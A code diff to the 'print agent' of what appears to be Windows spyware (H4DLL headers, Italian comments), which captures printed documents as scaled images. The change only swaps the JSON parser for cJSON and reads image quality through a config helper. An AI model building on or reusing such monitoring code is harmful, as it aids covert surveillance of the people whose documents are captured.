@@ -1,13 +1,14 @@
 #define _CRT_SECURE_NO_WARNINGS 1
 
 #include <Windows.h>
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/H4-DLL.h"
 #include "../../H4DLL/bss.h"
 #include "../../H4DLL/AM_Core.h"
 #include "../../H4DLL/HM_IpcModule.h"
 #include "../../H4DLL/HM_InbundleHook.h"
+#include "../../H4DLL/config.h"
 
 #define SCALING_FACTOR 6   // 1=dimensioni originali, 10=buona perdita
 #define DOC_NAME_LEN 256
@@ -618,15 +619,19 @@ DWORD WINAPI PM_PrintAgentStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD WINAPI PM_PrintAgentInit(JSONObject elem)
+DWORD WINAPI PM_PrintAgentInit(cJSON *elem)
 {
 	print_pool_conf print_conf;
 
+	DWORD image_quality = config_get_quality(elem);
 	// Setta lo scaling factor via IPC
 	print_conf.active = FALSE;
-	if (!wcscmp(elem[L"quality"]->AsString().c_str(), L"hi") ) {
+	if (image_quality == IMAGE_QUALITY_HIGH)
+	{
 		print_conf.scaling_factor = 2; 
-	} else if (!wcscmp(elem[L"quality"]->AsString().c_str(), L"med") ) {
+	} 
+	else if (image_quality == IMAGE_QUALITY_MEDIUM)
+	{
 		print_conf.scaling_factor = 4;
 	} else { 
 		print_conf.scaling_factor = 6;
@@ -639,5 +644,5 @@ DWORD WINAPI PM_PrintAgentInit(JSONObject elem)
 
 void PM_PrintAgentRegister()
 {
-	AM_MonitorRegister(L"print", PM_PRINTAGENT, (BYTE *)NULL, (BYTE *)PM_PrintAgentStartStop, (BYTE *)PM_PrintAgentInit, NULL);
+	AM_MonitorRegister("print", PM_PRINTAGENT, (BYTE *)NULL, (BYTE *)PM_PrintAgentStartStop, (BYTE *)PM_PrintAgentInit, NULL);
 }
